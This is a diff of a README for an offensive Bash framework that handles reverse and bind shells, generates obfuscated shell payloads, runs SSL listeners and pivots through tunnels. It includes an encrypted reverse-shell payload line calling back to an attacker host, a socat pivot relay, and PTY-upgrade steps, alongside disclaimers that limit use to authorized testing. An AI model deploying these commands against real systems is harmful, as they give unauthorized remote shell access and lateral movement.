@@ -1,6 +1,6 @@
 # RedTeam Shell Framework
 
-A modular, lightweight Bash framework for managing reverse shells, encrypted listeners, payload generation, file transfers, and pivoting — built for authorized penetration testing and security research.
+A modular, lightweight Bash framework for managing reverse shells, encrypted listeners, payload generation, file transfers, and network pivoting — built for authorized penetration testing and security research.
 
 > **Legal Notice:** This tool is intended exclusively for authorized security assessments, red team exercises, and educational use in controlled environments. Unauthorized use against any system is illegal. See [Legal Disclaimer](#legal-disclaimer).
 
@@ -27,11 +27,11 @@ A modular, lightweight Bash framework for managing reverse shells, encrypted lis
 RedTeam Shell Framework is a **controller–module CLI** built entirely in Bash. It wraps standard Unix networking tools (`nc`, `socat`, `openssl`, `ssh`) into an interactive menu-driven interface, enabling operators to:
 
 - Catch and manage reverse/bind shell connections
-- Generate payloads for multiple languages
+- Generate payloads for Bash, PowerShell, and Python
 - Establish SSL/TLS-encrypted shell channels
-- Transfer files securely with integrity checks
+- Transfer files securely with integrity verification
 - Create port-forwarding relays and SSH tunnels
-- Stabilize shells into full interactive PTYs
+- Stabilize limited shells into full interactive PTYs
 
 All activity is logged to `logs/framework.log` for audit purposes.
 
@@ -41,13 +41,13 @@ All activity is logged to `logs/framework.log` for audit purposes.
 
 | Module | Capability |
 |--------|------------|
-| **Listeners** | Reverse & bind listeners via `nc`/`ncat`, optional `rlwrap` for history |
-| **Payloads** | Bash, PowerShell, Python generators — Base64 encoding, obfuscation, save to file |
-| **Encryption** | `socat` SSL/TLS listener, RSA-2048 self-signed cert generation, encrypted payload |
-| **Transfer** | SCP upload/download, MD5 + SHA256 integrity verification, transfer history |
-| **Relay / Pivot** | `socat` port relay, SSH local / remote / dynamic (SOCKS) tunnels |
-| **PTY Upgrade** | Step-by-step guides for Python `pty.spawn`, `script`, environment fix |
-| **Logging** | Session IDs, event tracking, append-only log file in `logs/` |
+| **Listeners** | Reverse & bind listeners via `nc`/`ncat`, optional `rlwrap` for history, session tracking |
+| **Payloads** | Bash, PowerShell, Python generators — Base64 encoding, obfuscation, batch generation, save to file |
+| **Encryption** | `socat` SSL/TLS listener, RSA-2048 self-signed cert generation, encrypted payload output |
+| **Transfer** | SCP upload/download, MD5 + SHA256 checksum verification, transfer history |
+| **Relay / Pivot** | `socat` port relay, SSH local / remote / dynamic (SOCKS) tunnels, active relay management |
+| **PTY Upgrade** | Step-by-step guides for Python `pty.spawn`, `script`-based upgrade, environment stabilization |
+| **Logging** | Session IDs, event tracking, append-only JSON log in `logs/` |
 
 ---
 
@@ -56,7 +56,7 @@ All activity is logged to `logs/framework.log` for audit purposes.
 ```
 redteam-shell-framework/
 ├── shellmaster.sh          # Main CLI — interactive menu & module loader
-├── config.sh               # Global paths and environment configuration
+├── config.sh               # Global paths, version, and environment config
 ├── utils.sh                # Colors, validation, logging helpers, session utils
 │
 ├── modules/
@@ -65,8 +65,7 @@ redteam-shell-framework/
 │   ├── encrypt.sh          # SSL/TLS encrypted listener via socat
 │   ├── transfer.sh         # SCP file upload/download & checksum
 │   ├── relay.sh            # socat relay & SSH tunnel management
-│   ├── upgrade.sh          # PTY upgrade guides & environment stabilization
-│   └── logger.sh           # Audit logging and session management
+│   └── upgrade.sh          # PTY upgrade guides & environment stabilization
 │
 ├── docs/
 │   ├── ARCHITECTURE.md     # System design and module internals
@@ -76,10 +75,13 @@ redteam-shell-framework/
 │   ├── TROUBLESHOOTING.md  # Common issues and fixes
 │   └── DOCUMENTATION_INDEX.md
 │
-├── logs/                   # Runtime logs and session records
-├── tmp/                    # Temporary files (certs, keys)
-├── LICENSE
-└── .gitignore
+├── logs/                   # Runtime logs and session records (git-ignored)
+├── certs/                  # Generated certificates (git-ignored)
+├── payloads/               # Generated payload files (git-ignored)
+├── tmp/                    # Temporary files (git-ignored)
+├── .gitattributes          # Enforces LF line endings for all .sh files
+├── .gitignore
+└── LICENSE
 ```
 
 ---
@@ -101,12 +103,18 @@ redteam-shell-framework/
 | Tool | Purpose |
 |------|---------|
 | `rlwrap` | Command history and line editing in listeners |
-| `python3` | PTY upgrade (`pty.spawn`) |
+| `python3` | PTY upgrade via `pty.spawn` |
 
-### Install dependencies (Debian / Ubuntu)
+### Install dependencies — Debian / Ubuntu
 
 ```bash
 sudo apt update && sudo apt install -y netcat-traditional socat openssl rlwrap openssh-client python3
+```
+
+### Install dependencies — RHEL / CentOS
+
+```bash
+sudo yum install -y ncat socat openssl rlwrap openssh-clients python3
 ```
 
 ---
@@ -122,7 +130,7 @@ chmod +x shellmaster.sh modules/*.sh
 ./shellmaster.sh
 ```
 
-### Option 2 — Direct download (no Git required)
+### Option 2 — wget (no Git required)
 
 ```bash
 wget https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip
@@ -132,7 +140,7 @@ chmod +x shellmaster.sh modules/*.sh
 ./shellmaster.sh
 ```
 
-### Option 3 — curl
+### Option 3 — curl (no Git required)
 
 ```bash
 curl -L https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip -o framework.zip
@@ -142,7 +150,16 @@ chmod +x shellmaster.sh modules/*.sh
 ./shellmaster.sh
 ```
 
-> `git` is only needed to clone the repository. The framework itself has no dependency on it — it runs with standard Bash and Unix tools.
+> `git` is only needed to clone the repository. The framework itself depends only on standard Bash and Unix tools.
+
+### Running on Windows
+
+The framework requires a **Unix Bash environment**. On Windows, use **Git Bash**:
+
+1. Right-click the project folder → **Git Bash Here**
+2. Run `bash shellmaster.sh`
+
+> PowerShell and CMD are not supported.
 
 ---
 
@@ -189,18 +206,19 @@ The interactive menu will load:
 
 ### 1. Listeners
 
-Start a reverse or bind listener on any port. Optionally wrap with `rlwrap` for command history and line editing. Each session is assigned a unique ID and logged.
+Start a reverse or bind listener on any port. Optionally wrap with `rlwrap` for command history. Each session is assigned a unique ID and logged to `logs/sessions/`.
 
 ```
-1. Start Reverse Listener   – catches incoming shells
-2. Start Bind Listener      – listens for attacker to connect
-3. List Active Listeners
-4. Stop Listener
+1. Start Reverse Listener   — catches incoming shells on a port
+2. Start Bind Listener      — opens a backdoor that waits for connection
+3. List Active Listeners    — shows active nc/ncat processes
+4. Stop Listener            — kill by PID
+5. Back
 ```
 
 ### 2. Payload Generator
 
-Generate ready-to-use reverse shell one-liners with your IP and port injected. Supports optional Base64 encoding and variable obfuscation.
+Generate ready-to-use reverse shell one-liners. Supports Base64 encoding, variable obfuscation, and saving to `payloads/` with metadata.
 
 ```
 1. Bash Reverse Shell
@@ -209,34 +227,35 @@ Generate ready-to-use reverse shell one-liners with your IP and port injected. S
 4. One-Liner Templates
 5. View Generated Payloads
 6. Batch Generate (All Types)
+7. Back
 ```
-
-Payloads are saved to `payloads/` with metadata (filename, size, MD5, timestamp).
 
 ### 3. Encrypted Listener
 
-Wrap shell traffic in SSL/TLS using `socat` and a self-signed RSA-2048 certificate. Prevents cleartext inspection of the connection.
+Wraps shell traffic in SSL/TLS using `socat` and a self-signed RSA-2048 certificate stored in `certs/`. Prevents cleartext inspection of the connection.
 
 ```
 1. Generate New Certificate
 2. Start Encrypted Listener (socat SSL)
 3. Generate Encrypted Payload (for target)
+4. Back
 ```
 
-**Target payload example:**
+**Target payload:**
 ```bash
 socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
 ```
 
 ### 4. File Transfer
 
-Upload and download files over SCP. Verify integrity with MD5 and SHA256 checksums after transfer.
+Upload and download files over SCP. Verify file integrity with MD5 and SHA256 after transfer.
 
 ```
-1. Upload File   (local → remote via SCP)
-2. Download File (remote → local via SCP)
-3. Verify Checksum (MD5 + SHA256)
+1. Upload File    — local → remote via SCP
+2. Download File  — remote → local via SCP
+3. Verify Checksum — MD5 + SHA256 of any file
 4. View Transfer History
+5. Back
 ```
 
 ### 5. Relay / Pivot
@@ -244,42 +263,41 @@ Upload and download files over SCP. Verify integrity with MD5 and SHA256 checksu
 Create port-forwarding relays with `socat` or SSH tunnels to pivot through intermediate hosts.
 
 ```
-1. Create socat Relay       – forward traffic: listen_port → host:port
-2. Create SSH Tunnel        – local (-L), remote (-R), or SOCKS (-D)
+1. Create socat Relay   — forward: listen_port → host:port
+2. Create SSH Tunnel    — local (-L), remote (-R), or SOCKS (-D)
 3. List Active Relays
 4. Stop Relay
+5. Back
 ```
 
 **socat relay example:**
 ```bash
-# Traffic from port 4444 forwarded to internal host
 socat TCP-LISTEN:4444,fork,reuseaddr TCP:192.168.1.50:4444
 ```
 
-### 6. Shell Stabilization (PTY Upgrade)
+### 6. Shell Stabilization
 
-Step-by-step guides to upgrade a limited reverse shell to a fully interactive PTY.
+Step-by-step commands to upgrade a limited reverse shell to a fully interactive PTY.
 
 ```
-1. Python PTY Upgrade    – pty.spawn('/bin/bash') + stty raw -echo
-2. Script PTY Upgrade    – script -qc /bin/bash /dev/null
-3. Fix Environment       – TERM, PATH, stty rows/cols, reset
-4. Enable Terminal Features – history, colour prompt, aliases
+1. Python PTY Upgrade    — pty.spawn('/bin/bash') + stty raw -echo
+2. Script PTY Upgrade    — script -qc /bin/bash /dev/null
+3. Fix Environment       — TERM, PATH, stty rows/cols, reset
+4. Enable Terminal Features — history, colour prompt, tab completion
+5. Back
 ```
 
 ---
 
 ## Documentation
 
-Full documentation is in the `docs/` directory:
-
 | File | Contents |
 |------|----------|
-| [`ARCHITECTURE.md`](docs/ARCHITECTURE.md) | System design, data flow, module internals |
-| [`API.md`](docs/API.md) | Function reference for all modules |
-| [`EXAMPLES.md`](docs/EXAMPLES.md) | Real-world usage walkthroughs |
-| [`SECURITY.md`](docs/SECURITY.md) | Threat model and security considerations |
-| [`TROUBLESHOOTING.md`](docs/TROUBLESHOOTING.md) | Common issues and solutions |
+| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | System design, data flow, module internals |
+| [`docs/API.md`](docs/API.md) | Function reference for all modules and utils |
+| [`docs/EXAMPLES.md`](docs/EXAMPLES.md) | Real-world usage walkthroughs |
+| [`docs/SECURITY.md`](docs/SECURITY.md) | Threat model and security considerations |
+| [`docs/TROUBLESHOOTING.md`](docs/TROUBLESHOOTING.md) | Common issues and solutions |
 
 ---
 
@@ -288,12 +306,12 @@ Full documentation is in the `docs/` directory:
 This framework is provided for **educational purposes** and **authorized security testing only**.
 
 Permitted uses:
-- Authorized penetration testing engagements with written permission
+- Authorized penetration testing with explicit written permission
 - Red team exercises in controlled lab environments
 - Security research and tool development
 - Academic study of offensive security techniques
 
-**Using this tool against any system without explicit prior authorization is illegal** and may violate local, national, or international law. The author assumes no responsibility or liability for any misuse or damage caused by this software. By using this project, you accept full responsibility for your actions and compliance with all applicable laws.
+**Using this tool against any system without prior authorization is illegal** and may violate local, national, or international law. The author assumes no responsibility for any misuse or damage. By using this project, you accept full responsibility for your actions and compliance with all applicable laws.
 
 ---
 
@@ -307,4 +325,4 @@ Developed as part of ongoing research into shell handling, traffic encryption, a
 
 ## License
 
-This project is licensed under the **MIT License**. See the [`LICENSE`](LICENSE) file for full details.
+This project is licensed under the **MIT License**. See [`LICENSE`](LICENSE) for full details.
